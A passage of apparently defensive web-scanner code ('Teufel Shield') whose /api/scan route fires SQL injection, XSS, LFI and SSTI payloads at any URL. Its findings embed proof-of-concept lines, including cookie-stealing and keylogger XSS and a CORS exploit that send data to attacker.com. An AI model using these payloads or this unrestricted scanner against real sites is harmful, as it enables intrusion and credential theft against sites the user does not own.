  if (analytics.length > 0) tech["Analytics"] = analytics;
  
  // CDN
  const cdn: string[] = [];
  if (headers["x-cache"] || headers["x-cache-hits"]) cdn.push("CDN Detected");
  if (body.includes("cdnjs.cloudflare.com") || body.includes("cdn.cloudflare.com")) cdn.push("Cloudflare CDN");
  if (body.includes("cdn.jsdelivr.net")) cdn.push("jsDelivr");
  if (body.includes("unpkg.com")) cdn.push("unpkg");
  if (body.includes("maxcdn") || body.includes("bootstrapcdn")) cdn.push("BootstrapCDN");
  if (cdn.length > 0) tech["CDN"] = cdn;
  
  return tech;
}

// ═══════════════════════════════════════════════════════════════════════════════
// AI ANALYSIS HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════════

function buildScanDataForAI(scanResult: any, vulns: any[], summary: any): string {
  let data = `TARGET: ${scanResult.targetUrl}\n`;
  data += `SCAN DATE: ${scanResult.timestamp || new Date().toISOString()}\n`;
  data += `DURATION: ${scanResult.duration || "N/A"}\n`;
  data += `HTTP STATUS: ${scanResult.status || "N/A"}\n\n`;
  
  data += `VULNERABILITY SUMMARY:\n`;
  data += `  Critical: ${summary.critical || 0}\n`;
  data += `  High: ${summary.high || 0}\n`;
  data += `  Medium: ${summary.medium || 0}\n`;
  data += `  Low: ${summary.low || 0}\n`;
  data += `  Info: ${summary.info || 0}\n`;
  data += `  Total: ${summary.total || vulns.length}\n\n`;
  
  if (vulns.length > 0) {
    data += `VULNERABILITIES:\n`;
    vulns.slice(0, 30).forEach((v: any, i: number) => {
      data += `  ${i + 1}. [${(v.severity || "info").toUpperCase()}] ${v.type || "unknown"}\n`;
      data += `     Description: ${v.description || "N/A"}\n`;
      data += `     URL: ${v.url || "N/A"}\n`;
      if (v.cvss) data += `     CVSS: ${v.cvss.score}/10 (${v.cvss.vector || ""})\n`;
      if (v.cwe) data += `     CWE: ${v.cwe}\n`;
      if (v.owasp) data += `     OWASP: ${v.owasp}\n`;
    });
    data += "\n";
  }
  
  if (scanResult.serverInfo) {
    data += `SERVER INFO:\n`;
    data += `  Server: ${scanResult.serverInfo.server || "Unknown"}\n`;
    data += `  IP: ${scanResult.serverInfo.ip || "Unknown"}\n`;
    data += `  Technologies: ${JSON.stringify(scanResult.serverInfo.technologies || [])}\n\n`;
  }
  
  if (scanResult.openPorts?.length) {
    data += `OPEN PORTS:\n`;
    scanResult.openPorts.forEach((p: any) => {
      data += `  ${p.port}/${p.protocol || "tcp"} - ${p.service || "unknown"} ${p.version || ""}\n`;
    });
    data += "\n";
  }
  
  if (scanResult.sslCertificate) {
    const ssl = scanResult.sslCertificate;
    data += `SSL CERTIFICATE:\n`;
    data += `  Valid: ${ssl.isValid}\n`;
    data += `  Days Remaining: ${ssl.daysRemaining}\n`;
    data += `  Protocol: ${ssl.protocol || "Unknown"}\n`;
    data += `  Issuer: ${ssl.issuer || "Unknown"}\n\n`;
  }
  
  if (scanResult.dnsRecords?.length) {
    data += `DNS RECORDS:\n`;
    scanResult.dnsRecords.slice(0, 20).forEach((r: any) => {
      data += `  ${r.type}: ${r.value}\n`;
    });
    data += "\n";
  }
  
  if (scanResult.subdomains?.length) {
    data += `SUBDOMAINS FOUND: ${scanResult.subdomains.length}\n`;
    scanResult.subdomains.slice(0, 15).forEach((s: any) => {
      data += `  ${typeof s === "string" ? s : s.hostname || s.subdomain || JSON.stringify(s)}\n`;
    });
    data += "\n";
  }
  
  if (scanResult.adminPanels?.length) {
    data += `ADMIN PANELS FOUND: ${scanResult.adminPanels.length}\n`;
    scanResult.adminPanels.slice(0, 10).forEach((p: string) => {
      data += `  ${p}\n`;
    });
    data += "\n";
  }
  
  if (scanResult.directories?.length) {
    data += `DIRECTORIES FOUND: ${scanResult.directories.length}\n`;
    scanResult.directories.slice(0, 15).forEach((d: any) => {
      data += `  ${typeof d === "string" ? d : d.path || d.url || JSON.stringify(d)} (${d.status || ""})\n`;
    });
    data += "\n";
  }
  
  if (scanResult.securityHeaders) {
    data += `SECURITY HEADERS:\n`;
    const sh = scanResult.securityHeaders;
    Object.keys(sh).forEach(key => {
      data += `  ${key}: ${sh[key]}\n`;
    });
    data += "\n";
  }
  
  return data;
}

function generateLocalAnalysis(scanResult: any, lang: string, vulns: any[], summary: any, critical: number, high: number, medium: number, low: number, total: number): string {
  if (lang === "de") {
    let analysis = `═══════════════════════════════════════════════════════════════
TEUFEL SHIELD - KI-SICHERHEITSANALYSE (Lokal)
═══════════════════════════════════════════════════════════════

ZIEL: ${scanResult.targetUrl}
ANALYSEDATUM: ${new Date().toLocaleString("de-DE")}
HINWEIS: Lokale Analyse (keine API-Keys konfiguriert)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. GESAMTBEWERTUNG
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Gesamtrisikostufe: ${critical > 0 ? "KRITISCH" : high > 0 ? "HOCH" : medium > 0 ? "MITTEL" : "NIEDRIG"}

${total} Sicherheitsprobleme: ${critical} Kritisch, ${high} Hoch, ${medium} Mittel, ${low} Niedrig

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
2. SCHWACHSTELLEN
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    vulns.forEach((v: any) => {
      analysis += `[${(v.severity || "info").toUpperCase()}] ${v.type?.replace(/_/g, " ").toUpperCase() || "Unbekannt"}\n  ${v.description || ""}\n  URL: ${v.url || "N/A"}\n\n`;
    });
    analysis += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TEUFEL SHIELD | GAP PROTECTION | gap-protection.pro
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    return analysis;
  }
  
  let analysis = `═══════════════════════════════════════════════════════════════
TEUFEL SHIELD - AI SECURITY ANALYSIS (Local)
═══════════════════════════════════════════════════════════════

TARGET: ${scanResult.targetUrl}
ANALYSIS DATE: ${new Date().toLocaleString("en-US")}
NOTE: Local analysis (no API keys configured)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. OVERALL ASSESSMENT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Risk Level: ${critical > 0 ? "CRITICAL" : high > 0 ? "HIGH" : medium > 0 ? "MEDIUM" : "LOW"}

${total} issues: ${critical} Critical, ${high} High, ${medium} Medium, ${low} Low

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
2. VULNERABILITIES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  vulns.forEach((v: any) => {
    analysis += `[${(v.severity || "info").toUpperCase()}] ${v.type?.replace(/_/g, " ").toUpperCase() || "Unknown"}\n  ${v.description || ""}\n  URL: ${v.url || "N/A"}\n\n`;
  });
  analysis += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TEUFEL SHIELD | GAP PROTECTION | gap-protection.pro
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
  return analysis;
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {

  // Main scan endpoint - THE DEVIL SCANNER
  app.post("/api/scan", async (req, res) => {
    try {
      const validation = scanRequestSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({ error: "Invalid request" });
      }

      let { targetUrl } = validation.data;
      
      // Ensure URL has protocol
      if (!targetUrl.startsWith("http")) {
        targetUrl = "https://" + targetUrl;
      }

      let parsedUrl: URL;
      try {
        parsedUrl = new URL(targetUrl);
      } catch {
        return res.status(400).json({ error: "Invalid URL format" });
      }

      const baseUrl = `${parsedUrl.protocol}//${parsedUrl.host}`;
      const scanId = randomUUID();
      const startTime = Date.now();

      // Results storage
      const vulnerabilities: VulnerabilityFinding[] = [];
      const linksFound: string[] = [];
      const formsFound: string[] = [];
      const foldersFound: string[] = [];
      const adminPanels: string[] = [];
      const backupFiles: string[] = [];
      const sensitiveFiles: string[] = [];
      const techStack: Record<string, string[]> = {};
      const scanPhases: any[] = [];

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 0: INITIALIZATION - Connect and gather initial information
      // ══════════════════════════════════════════════════════════════════════
      
      let mainResponse: any;
      try {
        mainResponse = await fetchWithTimeout(targetUrl, {}, 15000);
      } catch (error: any) {
        return res.status(500).json({ 
          error: `Connection failed: ${error.message}`,
          target: targetUrl
        });
      }

      const headers = mainResponse.headers;
      const body = mainResponse.body;

      scanPhases.push({
        phase: 0,
        name: "Initialization",
        status: "Complete",
        details: `Connected to ${targetUrl} - Status: ${mainResponse.status}`
      });

      // Get Real IP
      try {
        const realIPs = await getRealIP(parsedUrl.hostname);
        if (realIPs.length > 0) {
          techStack["Real IP"] = realIPs;
        }
      } catch (e) {}

      // Detect technology stack
      const detectedTech = detectTechStack(headers, body);
      Object.assign(techStack, detectedTech);

      // Detect WAF/Protection
      const protections = detectProtection(headers, body);
      if (protections.length > 0) {
        techStack["Protection/WAF"] = protections;
      }

      // Extract cookies
      const cookies = extractCookies(headers);
      if (Object.keys(cookies).length > 0) {
        techStack["Cookies"] = Object.entries(cookies).map(([k, v]) => `${k}=${v}`);
        
        // Session detection
        const sessionCookies = Object.keys(cookies).filter(k => 
          /session|phpsessid|jsessionid|asp\.net_sessionid|token|auth|sid/i.test(k)
        );
        if (sessionCookies.length > 0) {
          techStack["Session Cookies"] = sessionCookies;
        }
      }

      // Protocol and status
      techStack["Protocol"] = [parsedUrl.protocol.replace(":", "").toUpperCase()];
      techStack["Status Code"] = [`${mainResponse.status}`];
      techStack["Content-Type"] = [headers["content-type"] || "Unknown"];

      // Build server headers list
      const serverHeaders: { name: string; value: string }[] = [];
      for (const [key, value] of Object.entries(headers)) {
        if (typeof value === "string") {
          serverHeaders.push({ name: key, value });
        }
      }

      // Build server info
      const serverInfo = {
        server: headers["server"] || "Unknown",
        poweredBy: headers["x-powered-by"] || "Unknown",
        contentType: headers["content-type"] || "Unknown",
        url: parsedUrl.hostname,
        port: parseInt(parsedUrl.port) || (parsedUrl.protocol === "https:" ? 443 : 80),
        ip: techStack["Real IP"]?.[0] || undefined,
      };

      // WAF detected list
      const wafDetected = protections;

      // Find sensitive data
      const sensitiveData = findSensitiveData(body);
      if (sensitiveData.length > 0) {
        techStack["Sensitive Data"] = sensitiveData;
        vulnerabilities.push({
          id: randomUUID(),
          type: "insecure_headers",
          severity: "high",
          url: targetUrl,
          description: `Sensitive data exposed: ${sensitiveData.join("; ")}`,
          why: "Exposing sensitive data like API keys, email addresses, or internal IPs can lead to account takeover, spam, or network reconnaissance",
          solution: "Remove all sensitive information from public-facing responses. Use environment variables and never hardcode secrets",
          reference: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
          recommendation: "Remove sensitive information from public responses",
          timestamp: new Date().toISOString(),
        });
      }

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 1: CRAWLING - Find all links, forms, and resources
      // ══════════════════════════════════════════════════════════════════════

      const { paramLinks, allLinks } = extractLinks(body, targetUrl);
      linksFound.push(...paramLinks);
      
      // Store links with parameters for vulnerability testing
      const linksWithParams = paramLinks;

      const forms = extractForms(body, targetUrl);
      for (const form of forms) {
        const inputNames = form.inputs.map((i: any) => `${i.name}(${i.type})`).join(", ");
        formsFound.push(`${form.method} ${form.action} - Inputs: ${inputNames}`);
      }

      scanPhases.push({
        phase: 1,
        name: "Crawling",
        status: "Complete",
        details: `Found ${linksFound.length} links with parameters, ${formsFound.length} forms`
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 2: SECURITY HEADERS CHECK
      // ══════════════════════════════════════════════════════════════════════

      const missingHeaders: string[] = [];
      for (const header of SECURITY_HEADERS) {
        if (!headers[header.toLowerCase()]) {
          missingHeaders.push(header);
        }
      }
      
      if (missingHeaders.length > 0) {
        vulnerabilities.push({
          id: randomUUID(),
          type: "insecure_headers",
          severity: missingHeaders.length > 5 ? "medium" : "low",
          url: targetUrl,
          description: `Missing ${missingHeaders.length} security headers: ${missingHeaders.join(", ")}`,
          why: "Missing security headers expose your application to various attacks including XSS, clickjacking, MIME sniffing, and protocol downgrade attacks",
          solution: "Add security headers: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Content-Security-Policy: default-src 'self', Strict-Transport-Security: max-age=31536000",
          reference: "https://owasp.org/www-project-secure-headers/",
          recommendation: "Implement all recommended security headers",
          timestamp: new Date().toISOString(),
        });
      }

      // Clickjacking check
      if (!headers["x-frame-options"] && !headers["content-security-policy"]?.includes("frame-ancestors")) {
        vulnerabilities.push(createProfessionalVuln(
          "clickjacking",
          "medium",
          targetUrl,
          "Site vulnerable to CLICKJACKING - Page can be embedded in malicious iframes",
          "Clickjacking (UI Redressing) attacks trick users into clicking hidden elements by overlaying transparent iframes. Attackers can hijack user actions like form submissions, button clicks, or even full credential theft",
          "1. Add X-Frame-Options header: X-Frame-Options: DENY or SAMEORIGIN\n2. Use CSP frame-ancestors: Content-Security-Policy: frame-ancestors 'none'\n3. Implement JavaScript frame-busting (as backup):\nif (top !== self) { top.location = self.location; }",
          "https://owasp.org/www-community/attacks/Clickjacking",
          {
            poc: `# Proof of Concept - Clickjacking\n# Create malicious HTML file:\n<html>\n<head><title>Win a Prize!</title></head>\n<body>\n  <h1>Click to Win!</h1>\n  <iframe src="${targetUrl}" style="opacity:0.1; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>\n</body>\n</html>\n\n# Test with curl:\ncurl -I "${targetUrl}" | grep -i "x-frame-options\\|content-security-policy"`,
          }
        ));
      }

      scanPhases.push({
        phase: 2,
        name: "Security Headers",
        status: "Complete",
        details: `Missing ${missingHeaders.length} security headers`
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 3: CORS CHECK
      // ══════════════════════════════════════════════════════════════════════

      try {
        const corsTest = await fetchWithTimeout(targetUrl, {
          headers: { "Origin": "https://evil.com" }
        }, 5000);
        const acao = corsTest.headers["access-control-allow-origin"];
        const acac = corsTest.headers["access-control-allow-credentials"];
        
        if (acao === "*") {
          vulnerabilities.push(createProfessionalVuln(
            "cors_misconfig",
            "medium",
            targetUrl,
            "CORS MISCONFIGURATION: Wildcard (*) Access-Control-Allow-Origin header detected",
            "Wildcard CORS allows ANY website to make cross-origin requests to your API. If combined with Access-Control-Allow-Credentials, attackers can steal authenticated user data from malicious websites",
            "1. Replace '*' with specific trusted origins:\n   Access-Control-Allow-Origin: https://trusted-domain.com\n2. Use a whitelist of allowed origins\n3. Never combine wildcard with credentials\n4. Validate Origin header server-side",
            "https://portswigger.net/web-security/cors",
            {
              poc: `# Proof of Concept - CORS Exploitation\n# Malicious JavaScript on attacker.com:\nfetch('${targetUrl}', {\n  credentials: 'include'\n})\n.then(r => r.text())\n.then(data => {\n  // Send stolen data to attacker server\n  fetch('https://attacker.com/steal?data=' + btoa(data));\n});\n\n# Test with curl:\ncurl -H "Origin: https://evil.com" -I "${targetUrl}" | grep -i "access-control"`,
            }
          ));
        } else if (acao === "https://evil.com") {
          vulnerabilities.push({
            id: randomUUID(),
            type: "cors_misconfig",
            severity: acac === "true" ? "critical" : "high",
            url: targetUrl,
            description: `CORS misconfiguration: Origin reflection detected${acac === "true" ? " with credentials" : ""}`,
            why: "Origin reflection allows attackers to steal sensitive data via cross-origin requests. With credentials enabled, session tokens can be stolen",
            solution: "Never reflect the Origin header. Validate origins against a strict whitelist of allowed domains",
            reference: "https://portswigger.net/web-security/cors",
            recommendation: "Validate origins against a whitelist and never reflect arbitrary origins",
            timestamp: new Date().toISOString(),
          });
        }
      } catch (e) {}

      scanPhases.push({
        phase: 3,
        name: "CORS Check",
        status: "Complete",
        details: "CORS configuration tested"
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 4: ADMIN PANEL DISCOVERY - ALL PATHS
      // ══════════════════════════════════════════════════════════════════════

      const adminChecks = ADMIN_PATHS.map(async (path) => {
        try {
          const adminUrl = new URL(path, baseUrl).toString();
          const adminResp = await fetchWithTimeout(adminUrl, {}, 5000);
          
          if (adminResp.status === 200) {
            adminPanels.push(`${adminUrl} (200 OK - ACCESSIBLE)`);
            return {
              id: randomUUID(),
              type: "admin_panels" as const,
              severity: "high" as const,
              url: adminUrl,
              description: `Admin panel ACCESSIBLE at ${path} - No authentication required!`,
              why: "Exposed admin panels allow attackers to access sensitive administrative functions, potentially leading to full site compromise",
              solution: "Implement multi-factor authentication, IP whitelisting, and rename admin path to non-standard location",
              reference: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information",
              poc: `curl '${adminUrl}'`,
              recommendation: "Implement strong authentication and IP restriction for admin panels",
              timestamp: new Date().toISOString(),
            };
          } else if (adminResp.status === 401 || adminResp.status === 403) {
            adminPanels.push(`${adminUrl} (${adminResp.status} - Protected)`);
            return {
              id: randomUUID(),
              type: "admin_panels" as const,
              severity: "info" as const,
              url: adminUrl,
              description: `Admin panel exists at ${path} (protected with ${adminResp.status})`,
              why: "While protected, exposing admin paths reveals application structure and can be targeted for brute-force attacks",
              solution: "Use a non-standard admin path and implement rate limiting on authentication endpoints",
              reference: "https://owasp.org/www-project-web-security-testing-guide/",
              recommendation: "Consider hiding admin panel or using non-standard path",
              timestamp: new Date().toISOString(),
            };
          } else if (adminResp.status === 302 || adminResp.status === 301) {
            adminPanels.push(`${adminUrl} (${adminResp.status} - Redirect to ${adminResp.redirectUrl || 'unknown'})`);
          }
        } catch (e) {}
        return null;
      });

      const adminResults = await Promise.all(adminChecks);
      for (const result of adminResults) {
        if (result) vulnerabilities.push(result);
      }

      scanPhases.push({
        phase: 4,
        name: "Admin Panel Discovery",
        status: "Complete",
        details: `Found ${adminPanels.length} admin panels`
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 5: BACKUP FILES DISCOVERY - ALL FILES
      // ══════════════════════════════════════════════════════════════════════

      const backupChecks = [];
      for (const file of BASE_FILES) {
        for (const ext of BACKUP_EXTENSIONS) {
          backupChecks.push(async () => {
            try {
              const backupUrl = new URL(`/${file}${ext}`, baseUrl).toString();
              const backupResp = await fetchWithTimeout(backupUrl, {}, 5000);
              
              if (backupResp.status === 200 && backupResp.body.length > 50) {
                backupFiles.push(backupUrl);
                return {
                  id: randomUUID(),
                  type: "backup_files" as const,
                  severity: (ext.includes(".sql") || ext.includes(".env") || ext.includes("config") ? "critical" : "high") as "critical" | "high",
                  url: backupUrl,
                  description: `Backup file exposed: ${file}${ext} (${backupResp.body.length} bytes)`,
                  why: "Backup files often contain source code, database credentials, API keys, and other sensitive information that can lead to complete compromise",
                  solution: "1. Delete backup files from public directories. 2. Block access via .htaccess. 3. Store backups in secure non-web-accessible locations",
                  reference: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information",
                  poc: `curl '${backupUrl}'`,
                  recommendation: "Remove backup files from web-accessible directories immediately",
                  timestamp: new Date().toISOString(),
                };
              }
            } catch (e) {}
            return null;
          });
        }
      }

      // Run backup checks in batches
      for (let i = 0; i < backupChecks.length; i += 20) {
        const batch = backupChecks.slice(i, i + 20);
        const results = await Promise.all(batch.map(fn => fn()));
        for (const result of results) {
          if (result) vulnerabilities.push(result);
        }
      }

      scanPhases.push({
        phase: 5,
        name: "Backup Files Discovery",
        status: "Complete",
        details: `Found ${backupFiles.length} backup files`
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 6: SENSITIVE FILES DISCOVERY - ALL FILES
      // ══════════════════════════════════════════════════════════════════════

      const sensitiveChecks = SENSITIVE_FILES.map(async (path) => {
        try {
          const fileUrl = new URL(path, baseUrl).toString();
          const fileResp = await fetchWithTimeout(fileUrl, {}, 5000);
          
          if (fileResp.status === 200 && fileResp.body.length > 10) {
            sensitiveFiles.push(`${fileUrl} (${fileResp.body.length} bytes)`);
            
            const isCritical = /\.env|\.git|config|passwd|shadow|htpasswd|credentials|secret|key/i.test(path);
            return {
              id: randomUUID(),
              type: "backup_files" as const,
              severity: (isCritical ? "critical" : "high") as "critical" | "high",
              url: fileUrl,
              description: `Sensitive file exposed: ${path}`,
              why: "Sensitive files like .env, .git, config files contain credentials, API keys, and internal paths that attackers can use for further exploitation",
              solution: "Block access using .htaccess rules: <FilesMatch '\\.(env|git|sql|bak)$'> Deny from all </FilesMatch>",
              reference: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information",
              poc: `curl '${fileUrl}'`,
              recommendation: "Block access to sensitive configuration files via .htaccess or server config",
              timestamp: new Date().toISOString(),
            };
          }
        } catch (e) {}
        return null;
      });

      const sensitiveResults = await Promise.all(sensitiveChecks);
      for (const result of sensitiveResults) {
        if (result) vulnerabilities.push(result);
      }

      scanPhases.push({
        phase: 6,
        name: "Sensitive Files Discovery",
        status: "Complete",
        details: `Found ${sensitiveFiles.length} sensitive files`
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 7: DIRECTORY DISCOVERY
      // ══════════════════════════════════════════════════════════════════════

      const dirChecks = COMMON_DIRECTORIES.map(async (dir) => {
        try {
          const dirUrl = new URL(dir + "/", baseUrl).toString();
          const dirResp = await fetchWithTimeout(dirUrl, {}, 5000);
          
          if (dirResp.status === 200 || dirResp.status === 403) {
            foldersFound.push(`${dirUrl} (${dirResp.status})`);
            
            // Check for directory listing
            if (dirResp.status === 200 && (dirResp.body.includes("Index of") || dirResp.body.includes("Directory listing"))) {
              return {
                id: randomUUID(),
                type: "path_traversal" as const,
                severity: "medium" as const,
                url: dirUrl,
                description: `Directory listing enabled at ${dir}/`,
                why: "Directory listing exposes file names and structure, helping attackers discover sensitive files and understand application architecture",
                solution: "Disable directory listing. Apache: 'Options -Indexes', Nginx: 'autoindex off;'",
                reference: "https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/",
                recommendation: "Disable directory listing in server configuration",
                timestamp: new Date().toISOString(),
              };
            }
          }
        } catch (e) {}
        return null;
      });

      const dirResults = await Promise.all(dirChecks);
      for (const result of dirResults) {
        if (result) vulnerabilities.push(result);
      }

      scanPhases.push({
        phase: 7,
        name: "Directory Discovery",
        status: "Complete",
        details: `Found ${foldersFound.length} directories`
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 8: SQL INJECTION TESTING
      // ══════════════════════════════════════════════════════════════════════

      for (const link of linksFound.slice(0, 20)) {
        for (const payload of SQL_PAYLOADS.slice(0, 10)) {
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
            const sqlResp = await fetchWithTimeout(testUrl, {}, 5000);
            const bodyLower = sqlResp.body.toLowerCase();
            
            const sqlErrors = [
              "sql syntax", "mysql", "mysqli", "sql error", "query failed",
              "database error", "ora-", "postgresql", "pg_", "sqlite",
              "syntax error", "unclosed quotation", "quoted string not properly terminated",
              "odbc", "jdbc", "sql server", "microsoft sql", "db2",
              "warning: mysql", "warning: pg_", "warning: sqlite",
            ];
            
            if (sqlErrors.some(err => bodyLower.includes(err))) {
              vulnerabilities.push(createProfessionalVuln(
                "sql_injection",
                "critical",
                link,
                `SQL INJECTION DETECTED! Database error exposed in response when testing parameter injection`,
                "SQL Injection allows attackers to read, modify, or delete database contents. Can lead to complete database compromise, authentication bypass, data exfiltration, and potential remote code execution via SQL features like xp_cmdshell",
                "1. Use parameterized queries: $stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $stmt->execute([$id]);\n2. Use ORM frameworks (Eloquent, Hibernate)\n3. Implement input validation with whitelists\n4. Apply principle of least privilege to database accounts",
                "https://owasp.org/www-community/attacks/SQL_Injection",
                {
                  payload: payload,
                  poc: `# Proof of Concept - SQL Injection\ncurl -v '${testUrl}'\n\n# SQLMap exploitation:\nsqlmap -u "${link}" --batch --dbs\n\n# Manual testing:\n' OR 1=1-- \n' UNION SELECT null,username,password FROM users--`,
                  evidence: `Database error detected in response when payload "${payload}" was injected`,
                }
              ));
              break;
            }
          } catch (e) {}
        }
      }

      scanPhases.push({
        phase: 8,
        name: "SQL Injection Testing",
        status: "Complete",
        details: `Tested ${Math.min(linksFound.length, 20)} links`
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 9: XSS TESTING
      // ══════════════════════════════════════════════════════════════════════

      for (const link of linksFound.slice(0, 20)) {
        for (const payload of XSS_PAYLOADS.slice(0, 8)) {
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
            const xssResp = await fetchWithTimeout(testUrl, {}, 5000);
            
            if (xssResp.body.includes(payload) || 
                (payload.includes("<script>") && xssResp.body.toLowerCase().includes("<script>"))) {
              vulnerabilities.push(createProfessionalVuln(
                "xss",
                "high",
                link,
                `REFLECTED XSS DETECTED! Payload reflected in response without proper encoding or sanitization`,
                "Cross-Site Scripting allows attackers to execute malicious JavaScript in victim's browser. This can lead to session hijacking via cookie theft, keylogging, phishing attacks, website defacement, and malware distribution",
                "1. HTML encode all output: htmlspecialchars($data, ENT_QUOTES, 'UTF-8')\n2. Implement Content Security Policy: Content-Security-Policy: script-src 'self'\n3. Set HttpOnly and Secure flags on cookies\n4. Use modern frameworks with auto-escaping (React, Vue, Angular)",
                "https://owasp.org/www-community/attacks/xss/",
                {
                  payload: payload,
                  poc: `# Proof of Concept - XSS\ncurl -v '${testUrl}'\n\n# Session stealing payload:\n<script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n\n# Keylogger payload:\n<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log?k='+e.key;}</script>`,
                  evidence: `XSS payload "${payload}" was reflected in the HTTP response without encoding`,
                }
              ));
              break;
            }
          } catch (e) {}
        }
      }

      scanPhases.push({
        phase: 9,
        name: "XSS Testing",
        status: "Complete",
        details: `Tested ${Math.min(linksFound.length, 20)} links`
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 10: LFI TESTING
      // ══════════════════════════════════════════════════════════════════════

      const lfiParams = ["file", "page", "path", "include", "template", "doc", "folder", "root", "lang", "load", "read"];
      
      for (const link of linksFound.slice(0, 15)) {
        if (lfiParams.some(p => link.toLowerCase().includes(p + "="))) {
          for (const payload of LFI_PAYLOADS.slice(0, 8)) {
            try {
              const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
              const lfiResp = await fetchWithTimeout(testUrl, {}, 5000);
              
              if (lfiResp.body.includes("root:") || 
                  lfiResp.body.includes("[boot loader]") ||
                  lfiResp.body.includes("daemon:") ||
                  lfiResp.body.includes("bin:") ||
                  lfiResp.body.includes("[extensions]")) {
                vulnerabilities.push({
                  id: randomUUID(),
                  type: "lfi",
                  severity: "critical",
                  url: link,
                  payload: payload,
                  description: `LFI DETECTED! System files readable - /etc/passwd exposed`,
                  why: "Local File Inclusion allows reading any file on the server including /etc/passwd, source code, configuration files with credentials, and can escalate to Remote Code Execution",
                  solution: "1. Whitelist allowed files. 2. Use basename() to strip paths. 3. Never use user input directly in file operations. 4. Use realpath() to resolve paths",
                  reference: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
                  poc: `curl '${testUrl}'`,
                  recommendation: "Validate and whitelist allowed file paths, use realpath()",
                  timestamp: new Date().toISOString(),
                });
                break;
              }
            } catch (e) {}
          }
        }
      }

      scanPhases.push({
        phase: 10,
        name: "LFI Testing",
        status: "Complete",
        details: "Local File Inclusion tests completed"
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 11: SSTI TESTING
      // ══════════════════════════════════════════════════════════════════════

      for (const link of linksFound.slice(0, 10)) {
        for (const payload of SSTI_PAYLOADS.slice(0, 5)) {
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
            const sstiResp = await fetchWithTimeout(testUrl, {}, 5000);
            
            if (sstiResp.body.includes("49") && payload.includes("7*7")) {
              vulnerabilities.push({
                id: randomUUID(),
                type: "ssti",
                severity: "critical",
                url: link,
                payload: payload,
                description: `SSTI DETECTED! Template injection leads to code execution`,
                why: "Server-Side Template Injection allows attackers to inject code into templates, leading to remote code execution on the server",
                solution: "1. Never pass user input directly to template engines. 2. Use sandboxed template environments. 3. Use logic-less templates (Mustache) when possible",
                reference: "https://portswigger.net/web-security/server-side-template-injection",
                poc: `curl '${testUrl}'`,
                recommendation: "Never use user input in templates, use sandboxed template engines",
                timestamp: new Date().toISOString(),
              });
              break;
            }
          } catch (e) {}
        }
      }

      scanPhases.push({
        phase: 11,
        name: "SSTI Testing",
        status: "Complete",
        details: "Server-Side Template Injection tests completed"
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 12: OPEN REDIRECT TESTING
      // ══════════════════════════════════════════════════════════════════════

      const redirectParams = ["url", "redirect", "next", "return", "goto", "target", "dest", "continue", "rurl", "out", "link", "ref"];
      
      for (const link of linksFound.slice(0, 10)) {
        if (redirectParams.some(p => link.toLowerCase().includes(p + "="))) {
